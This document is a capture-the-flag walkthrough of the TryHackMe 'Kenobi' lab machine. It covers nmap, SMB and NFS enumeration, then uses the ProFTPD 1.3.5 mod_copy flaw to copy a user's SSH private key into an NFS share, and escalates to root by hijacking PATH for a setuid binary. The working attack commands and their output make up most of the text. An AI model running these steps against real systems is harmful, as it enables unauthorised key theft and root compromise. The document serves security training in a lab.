# What I learned
- Privilege Escalation with Path Variable Manipulation 
- nmap scan with smb and rpcbind script
- searchsploit


# enumerate
## nmap
```console
kali@kali:~/THM$ sudo python3 ../pymap.py -t 10.10.120.243
[sudo] password for kali: 
created by gu2rks/kurohat 
find me here https://github.com/gu2rks

port scanning...
21/tcp   open  ftp
22/tcp   open  ssh
80/tcp   open  http
111/tcp  open  rpcbind
139/tcp  open  netbios-ssn
445/tcp  open  microsoft-ds
2049/tcp open  nfs
Enumerating open ports...
Starting Nmap 7.80 ( https://nmap.org ) at 2020-07-19 07:16 EDT
Nmap scan report for 10.10.120.243
Host is up (0.044s latency).

PORT     STATE SERVICE     VERSION
21/tcp   open  ftp         ProFTPD 1.3.5
22/tcp   open  ssh         OpenSSH 7.2p2 Ubuntu 4ubuntu2.7 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 b3:ad:83:41:49:e9:5d:16:8d:3b:0f:05:7b:e2:c0:ae (RSA)
|   256 f8:27:7d:64:29:97:e6:f8:65:54:65:22:f7:c8:1d:8a (ECDSA)
|_  256 5a:06:ed:eb:b6:56:7e:4c:01:dd:ea:bc:ba:fa:33:79 (ED25519)
80/tcp   open  http        Apache httpd 2.4.18 ((Ubuntu))
| http-robots.txt: 1 disallowed entry 
|_/admin.html
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Site doesn't have a title (text/html).
111/tcp  open  rpcbind     2-4 (RPC #100000)
| rpcinfo: 
|   program version    port/proto  service
|   100000  2,3,4        111/tcp   rpcbind
|   100000  2,3,4        111/udp   rpcbind
|   100000  3,4          111/tcp6  rpcbind
|   100000  3,4          111/udp6  rpcbind
|   100003  2,3,4       2049/tcp   nfs
|   100003  2,3,4       2049/tcp6  nfs
|   100003  2,3,4       2049/udp   nfs
|   100003  2,3,4       2049/udp6  nfs
|   100005  1,2,3      42988/udp   mountd
|   100005  1,2,3      48816/udp6  mountd
|   100005  1,2,3      53005/tcp   mountd
|   100005  1,2,3      53817/tcp6  mountd
|   100021  1,3,4      35055/udp6  nlockmgr
|   100021  1,3,4      36295/tcp   nlockmgr
|   100021  1,3,4      39234/udp   nlockmgr
|   100021  1,3,4      43455/tcp6  nlockmgr
|   100227  2,3         2049/tcp   nfs_acl
|   100227  2,3         2049/tcp6  nfs_acl
|   100227  2,3         2049/udp   nfs_acl
|_  100227  2,3         2049/udp6  nfs_acl
139/tcp  open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp  open  netbios-ssn Samba smbd 4.3.11-Ubuntu (workgroup: WORKGROUP)
2049/tcp open  nfs_acl     2-3 (RPC #100227)
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Aggressive OS guesses: Linux 3.10 - 3.13 (95%), ASUS RT-N56U WAP (Linux 3.4) (95%), Linux 3.16 (95%), Linux 3.1 (93%), Linux 3.2 (93%), AXIS 210A or 211 Network Camera (Linux 2.6.17) (92%), Sony Android TV (Android 5.0) (92%), Android 5.0 - 6.0.1 (Linux 3.4) (92%), Android 5.1 (92%), Android 7.1.1 - 7.1.2 (92%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 2 hops
Service Info: Host: KENOBI; OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Host script results:
|_clock-skew: mean: 1h39m59s, deviation: 2h53m12s, median: 0s
|_nbstat: NetBIOS name: KENOBI, NetBIOS user: <unknown>, NetBIOS MAC: <unknown> (unknown)
| smb-os-discovery: 
|   OS: Windows 6.1 (Samba 4.3.11-Ubuntu)
|   Computer name: kenobi
|   NetBIOS computer name: KENOBI\x00
|   Domain name: \x00
|   FQDN: kenobi
|_  System time: 2020-07-19T06:16:53-05:00
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb2-security-mode: 
|   2.02: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2020-07-19T11:16:52
|_  start_date: N/A

TRACEROUTE (using port 80/tcp)
HOP RTT      ADDRESS
1   43.55 ms 10.8.0.1
2   43.49 ms 10.10.120.243

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 18.05 seconds
```

## enumerating SAMBA
```console
kali@kali:~/THM$ nmap -p 445 --script=smb-enum-shares.nse,smb-enum-users.nse 10.10.120.243
Starting Nmap 7.80 ( https://nmap.org ) at 2020-07-19 07:21 EDT
Nmap scan report for 10.10.120.243
Host is up (0.044s latency).

PORT    STATE SERVICE
445/tcp open  microsoft-ds

Host script results:
| smb-enum-shares: 
|   account_used: guest
|   \\10.10.120.243\IPC$: 
|     Type: STYPE_IPC_HIDDEN
|     Comment: IPC Service (kenobi server (Samba, Ubuntu))
|     Users: 1
|     Max Users: <unlimited>
|     Path: C:\tmp
|     Anonymous access: READ/WRITE
|     Current user access: READ/WRITE
|   \\10.10.120.243\anonymous: 
|     Type: STYPE_DISKTREE
|     Comment: 
|     Users: 0
|     Max Users: <unlimited>
|     Path: C:\home\kenobi\share
|     Anonymous access: READ/WRITE
|     Current user access: READ/WRITE
|   \\10.10.120.243\print$: 
|     Type: STYPE_DISKTREE
|     Comment: Printer Drivers
|     Users: 0
|     Max Users: <unlimited>
|     Path: C:\var\lib\samba\printers
|     Anonymous access: <none>
|_    Current user access: <none>
|_smb-enum-users: ERROR: Script execution failed (use -d to debug)

Nmap done: 1 IP address (1 host up) scanned in 6.85 seconds
```

## rpcbind port 111
service rpcbind is an server that converts remote procedure call (RPC) program number into universal addresses. When an RPC service is started, it tells rpcbind the address at which it is listening and the RPC program number its prepared to serve. 
```console
kali@kali:~/THM/kenobi$ nmap -p 111 --script=nfs-ls,nfs-statfs,nfs-showmount 10.10.120.243
Starting Nmap 7.80 ( https://nmap.org ) at 2020-07-19 07:40 EDT
Nmap scan report for 10.10.120.243
Host is up (0.047s latency).

PORT    STATE SERVICE
111/tcp open  rpcbind
| nfs-showmount: 
|_  /var *

Nmap done: 1 IP address (1 host up) scanned in 0.68 seconds
```

# Foothold
from the first scan: we notice that ProFTPD 1.3.5 were use to run FTP. let search for exploit.
```console
kali@kali:~/THM/kenobi$ searchsploit ProFTPD 1.3.5
----------------------------------------------------------------- ---------------------------------
 Exploit Title                                                   |  Path
----------------------------------------------------------------- ---------------------------------
ProFTPd 1.3.5 - 'mod_copy' Command Execution (Metasploit)        | linux/remote/37262.rb
ProFTPd 1.3.5 - 'mod_copy' Remote Command Execution              | linux/remote/36803.py
ProFTPd 1.3.5 - File Copy                                        | linux/remote/36742.txt
----------------------------------------------------------------- ---------------------------------
Shellcodes: No Results
Papers: No Results
```
The `mod_copy` module implements ```SITE CPFR``` and ```SITE CPTO``` commands, which can be used to copy files/directories from one place to another on the server. Any unauthenticated client can leverage these commands to copy files from any part of the filesystem to a chosen destination.

- SITE CPFR : copy from
- SITE CPTO : copy to

We know from the `log.txt` that FTP is run by Kenobi which mean we will get Kenobi priv if we compomised FTP. The plan is copy his SSH private key and put it in `/var`, WHY? coz the mount poin for NFS is at `/var`. We will use NFS to get the key later on!.


now let copy it Kenobi ssh key using ```SITE CPFR``` and ```SITE CPTO`` via netcat and put it in `/var`:
```console
kali@kali:~/THM/kenobi$ nc 10.10.120.243 21
220 ProFTPD 1.3.5 Server (ProFTPD Default Installation) [10.10.120.243]
SITE CPFR /home/kenobi/.ssh/id_rsa
350 File or directory exists, ready for destination name
SITE CPTO /var/tmp/id_rsa
250 Copy successful
```
let mount `/var/tmp` to our Kali and get the fcing key!
```console
kali@kali:~/THM/kenobi$ mkdir NFS
kali@kali:~/THM/kenobi$ sudo mount 10.10.120.243:/var NFS #mount
kali@kali:~/THM/kenobi$ ls NFS/tmp/
id_rsa
systemd-private-2408059707bc41329243d2fc9e613f1e-systemd-timesyncd.service-a5PktM/
systemd-private-6f4acd341c0b40569c92cee906c3edc9-systemd-timesyncd.service-z5o4Aw/
systemd-private-e69bbb0653ce4ee3bd9ae0d93d2a5806-systemd-timesyncd.service-zObUdn/
systemd-private-ef8cb470bb2f4219b0e5c411e18962d4-systemd-timesyncd.service-yFRo9P/                                                             
kali@kali:~/THM/kenobi$ cp NFS/tmp/id_rsa kenobi-key #copy key
kali@kali:~/THM/kenobi$ umount NFS # unmout
```
let SSH to the machine using the key
```console
kali@kali:~/THM/kenobi$ chmod 600 kenobi-key 
kali@kali:~/THM/kenobi$ ssh -i kenobi-key kenobi@10.10.120.243
kenobi@kenobi:~$ 
```
WE ARE IN
# ROOT
there are a binary file that looks odd `/usr/bin/menu`, I checked for `ltrace` but nope it is uninstalled.
I then using strings to examing `/usr/bin/menu`
```console
kenobi@kenobi:~$ strings /usr/bin/menu
.
.
.
***************************************
1. status check
2. kernel version
3. ifconfig
** Enter your choice :
curl -I localhost
uname -r
ifconfig
.
.
.
```
This shows us the binary is running without a full path (e.g. not using /usr/bin/curl or /usr/bin/uname). As this file runs as the root users privileges, we can manipulate our path gain a root shell.

the plan is: We copied the `/bin/sh` shell, called it `curl`, `uname`, or `ifconfig` (choose one) and gave it the correct permissions and then **put its location in our path**. This meant that when the `/usr/bin/menu` binary was run, its using our path variable to find the "fake" binary what we created. Which is actually a version of `/usr/sh`, as well as **this file being run as root it runs our shell as root!**

```console
kenobi@kenobi:~$ cd /tmp/
kenobi@kenobi:/tmp$ echo '/bin/sh' > uname
kenobi@kenobi:/tmp$ chmod 777 uname 
kenobi@kenobi:/tmp$ export PATH=/tmp:$PATH
kenobi@kenobi:/tmp$ /usr/bin/menu

***************************************
1. status check
2. kernel version
3. ifconfig
** Enter your choice :2
# whoami
root
# cat /root/root.txt
177b3cd8562289f37382721c28381f02
```